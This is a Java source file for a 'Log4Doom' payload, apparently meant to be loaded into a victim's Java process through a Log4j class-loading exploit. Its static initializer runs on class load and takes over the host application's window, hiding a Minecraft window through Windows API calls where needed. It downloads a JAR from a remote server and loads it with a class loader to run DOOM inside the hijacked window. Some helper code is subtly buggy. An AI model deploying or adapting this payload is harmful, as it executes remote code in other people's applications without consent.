import java.awt.Color;
import java.awt.Dimension;
import java.awt.Frame;
import java.awt.GraphicsConfiguration;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinDef.RECT;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.WNDENUMPROC;
import com.sun.jna.win32.StdCallLibrary;

public class Log4DoomPayload {
	public static final String MOCHADOOM_MODIFIED_SOURCE = "https://jenkins.novauniverse.net/job/mochadoom-modified/lastBuild/net.zeeraa.mochadoom$MochadoomModified/artifact/net.zeeraa.mochadoom/MochadoomModified/0.0.1-SNAPSHOT/MochadoomModified-0.0.1-SNAPSHOT.jar";
	public static final String WAD_SOURCE = "https://ia600609.us.archive.org/16/items/DoomsharewareEpisode/doom.ZIP";

	public static final String ENGINE_CLASS = "net.zeeraa.mochadoom.Engine";
	public static final String DOOM_MAIN_CLASS = "net.zeeraa.mochadoom.doom.DoomMain";

	public static void main(String[] args) throws InterruptedException {
	}

	static {
		System.out.println("Starting Log4Doom payload");
		try {
			run();
		} catch (Exception e) {
			e.printStackTrace();
			JOptionPane.showMessageDialog(null, "Failed to set up log4doom. " + e.getClass().getName() + " " + e.getMessage(), "Error", JOptionPane.OK_OPTION);
			System.err.println("Failed to set up log4doom. " + e.getClass().getName() + " " + e.getMessage());
		}
	}

	private static void run() throws Exception {
		List<JFrame> runningFrames = new ArrayList<>();

		for (Frame f : JFrame.getFrames()) {
			if (f instanceof JFrame) {
				runningFrames.add((JFrame) f);
			}
		}
		
		System.out.println("Found " + runningFrames.size() + " jframes");

		JFrame frameToUse = null;

		if (runningFrames.size() == 0) {
			System.err.println("No running jframes found");
			try {
				Class.forName("net.minecraft.client.main.Main");
				System.out.println("Seems like we are running in minecraft. Minecraft uses OpenGL windows instead of JFrames so lets use a trick to make it seem like the minecraft window is running doom");
				frameToUse = fakeMinecraftJFrame();
				if (frameToUse == null) {
					System.out.println("Never mind it also failed :(");
					JOptionPane.showMessageDialog(null, "Failed to init window", "Error", JOptionPane.OK_OPTION);
					return;
				}
			} catch (ClassNotFoundException e) {
				return;
			}

		} else {
			if (runningFrames.size() == 1) {
				System.out.println("Using first frame since there there was only 1 jframe found");
				frameToUse = runningFrames.get(0);
			} else {
				System.out.println("Using first visible frame or first since there where multiple jframes found");
				frameToUse = runningFrames.stream().filter(JFrame::isVisible).findFirst().orElse(runningFrames.get(0));
			}
		}
		
		frameToUse.getContentPane().removeAll();
		frameToUse.getContentPane().setBackground(Color.BLACK);
		frameToUse.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frameToUse.repaint();

		File tempFile = Files.createTempDirectory("jog4doom_assets").toFile();
		System.out.println("Using path " + tempFile.getAbsolutePath() + " for storing data");
		tempFile.deleteOnExit();

		System.out.println("Doawnloading DOOM1.WAD");
		File wadFile = downloadDoom(MOCHADOOM_MODIFIED_SOURCE, tempFile);
		wadFile.deleteOnExit();
		System.out.println("DOOM1.WAD downloaded to " + wadFile.getAbsolutePath());

		System.out.println("Downloading modified Mochadoom");
		File mochadoomJar = new File(tempFile.getAbsolutePath() + File.separator + "MochadoomModified.jar");
		downloadFile(MOCHADOOM_MODIFIED_SOURCE, mochadoomJar.getAbsolutePath());
		System.out.println("MochadoomModified downloaded to " + mochadoomJar.getAbsolutePath());
		mochadoomJar.deleteOnExit();

		URL jarUrl = mochadoomJar.toURI().toURL();
		System.out.println("Creating URLClassLoader with url: " + jarUrl.toString());
		URLClassLoader classLoader = new URLClassLoader(new URL[] { jarUrl });

		Class<?> doomEngineClass = classLoader.loadClass(ENGINE_CLASS);
		System.out.println("Doom engine class: " + doomEngineClass.getName());

		String[] doomArgs = new String[] {
				"-iwad",
				wadFile.getAbsolutePath()
		};

		System.out.println("Starting Mochadoom");
		Object engine = doomEngineClass.getConstructor(JFrame.class, String[].class).newInstance(frameToUse, doomArgs);
		System.out.println("Engine initialized. " + engine.getClass().getName());

		System.out.println("Fetching field DOOM in Engine");
		Field doomField = doomEngineClass.getDeclaredField("DOOM");

		Class<?> doomMainClass = classLoader.loadClass(DOOM_MAIN_CLASS);
		System.out.println("Getting instance of " + doomMainClass.getName());
		Object doomMain = doomField.get(engine);

		System.out.println("Fetching method setupLoop() from DoomMain");
		Method setupLoopMethod = doomMainClass.getDeclaredMethod("setupLoop");

		System.out.println("Engine initialized. Calling setupLoop on " + doomMainClass.getName());
		setupLoopMethod.invoke(doomMain);

		classLoader.close();
	}

	public static final File downloadDoom(String zipFileUrl, File outputDirectory) throws IOException {
		File tmpFile = new File(outputDirectory.getAbsolutePath() + File.separator + "tmp.zip");
		tmpFile.deleteOnExit();
		downloadFile(WAD_SOURCE, tmpFile.getAbsolutePath());
		ZipFile zipFile = new ZipFile(tmpFile);
		ZipEntry entry = zipFile.getEntry("DOOM1.WAD");

		File outputFile = new File(outputDirectory.getAbsolutePath() + File.separator + "DOOM1.WAD");

		InputStream inputStream = zipFile.getInputStream(entry);
		OutputStream outputStream = new FileOutputStream(outputFile);
		byte[] buffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = inputStream.read(buffer)) != -1) {
			outputStream.write(buffer, 0, bytesRead);
		}

		outputStream.close();
		zipFile.close();
		tmpFile.delete();

		return outputFile;
	}

	public static final void downloadFile(String fileUrl, String savePath) throws FileNotFoundException, IOException {
		URL url = new URL(fileUrl);

		BufferedInputStream in = new BufferedInputStream(url.openStream());
		FileOutputStream fileOutputStream = new FileOutputStream(savePath);

		byte[] dataBuffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
			fileOutputStream.write(dataBuffer, 0, bytesRead);
		}

		in.close();
		fileOutputStream.close();
	}

	public static JFrame fakeMinecraftJFrame() {
		List<WindowData> windows = new ArrayList<>();

		final User32 user32 = User32.INSTANCE;

		System.out.println("-------------------------------------");
		user32.EnumWindows(new WNDENUMPROC() {
			int count = 0;

			@Override
			public boolean callback(HWND hWnd, Pointer arg1) {
				byte[] windowText = new byte[512];
				user32.GetWindowTextA(hWnd, windowText, 512);
				String wText = Native.toString(windowText);

				if (wText.isEmpty()) {
					return true;
				}

				System.out.println("Found window with text " + hWnd + ", total " + ++count + " Text: " + wText);

				windows.add(new WindowData(hWnd, wText));
				return true;
			}
		}, null);
		System.out.println("-------------------------------------");
		System.out.println("Windows found: " + windows.size());
		windows.removeIf(w -> !w.getwText().toLowerCase().contains("minecraft"));

		Collections.sort(windows, (w1, w2) -> {
			if (w1.getwText().toLowerCase().contains("minecraft 1") && !w1.getwText().toLowerCase().contains("minecraft 1")) {
				return -1; // s1 comes first
			} else if (!w1.getwText().toLowerCase().contains("minecraft 1") && w1.getwText().toLowerCase().contains("minecraft 1")) {
				return 1; // s2 comes first
			} else {
				return w1.getwText().toLowerCase().compareTo(w1.getwText().toLowerCase());
			}
		});

		System.out.println("Windows found after filtering: " + windows.size());
		windows.forEach(w -> System.out.println("Window named: " + w.getwText()));

		if(windows.size() == 0) {
			System.err.println("No potential minecraft windows found");
			return null;
		}
		
		WindowData mostLikley = windows.get(0);
		if (mostLikley == null) {
			JOptionPane.showMessageDialog(null, "No potential minecraft windows found. Game might be modded or window title changed to non default value", "Error", JOptionPane.OK_OPTION);
			System.out.println("No potential minecraft windows found. Game might be modded or window title changed to non default value");
			return null;
		}
		System.out.println("Determined that the window " + mostLikley.gethWnd() + " with title " + mostLikley.getwText() + " is the minecraft game window");

		RECT rect = new RECT();
		long handle = Pointer.nativeValue(mostLikley.gethWnd().getPointer());
		System.out.println("Handle: " + handle);
		user32.GetWindowRect(handle, rect);
		System.out.println("Rect: top: " + rect.top + " right: " + rect.right + " bottom: " + rect.bottom + " left: " + rect.left);

		int x = rect.left;
		int y = rect.top;

		int width = rect.right - x;
		int height = rect.bottom - y;

		if (x < -1000 || y < -1000) {
			// Probably fullscreen but window hidden. Do full monitor size
			x = 0;
			y = 0;

			GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
			GraphicsDevice[] screenDevices = ge.getScreenDevices();

			if (screenDevices.length > 0) {
				GraphicsConfiguration primaryScreen = screenDevices[0].getDefaultConfiguration();
				int screenWidth = primaryScreen.getBounds().width;
				int screenHeight = primaryScreen.getBounds().height;

				System.out.println("Primary Monitor Size:");
				System.out.println("Width: " + screenWidth + " pixels");
				System.out.println("Height: " + screenHeight + " pixels");
				width = screenWidth;
				height = screenHeight;
			} else {
				JOptionPane.showMessageDialog(null, "No screens found", "Error", JOptionPane.OK_OPTION);
				System.err.println("No screens found.");
				return null;
			}
		}

		System.out.println("Window position: X: " + x + " Y: " + y + " wifhr: " + width + " height: " + height);

		JFrame frame = new JFrame();

		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setSize(new Dimension(width, height));
		frame.setLocation(x, y);
		frame.setTitle(mostLikley.getwText());

		System.out.println("Hiding real minecraft window");
		user32.ShowWindow(handle, 0);

		frame.setVisible(true);

		return frame;
	}
}

interface User32 extends StdCallLibrary {
	@SuppressWarnings("deprecation")
	User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class);

	boolean EnumWindows(WinUser.WNDENUMPROC lpEnumFunc, Pointer arg);

	boolean GetWindowRect(long hwnd, RECT rect);

	boolean ShowWindow(long hwnd, int show);

	int GetWindowTextA(HWND hWnd, byte[] lpString, int nMaxCount);
}

class WindowData {
	private HWND hWnd;
	private String wText;

	public WindowData(HWND hWnd, String wText) {
		this.hWnd = hWnd;
		this.wText = wText;
	}

	public HWND gethWnd() {
		return hWnd;
	}

	public String getwText() {
		return wText;
	}
}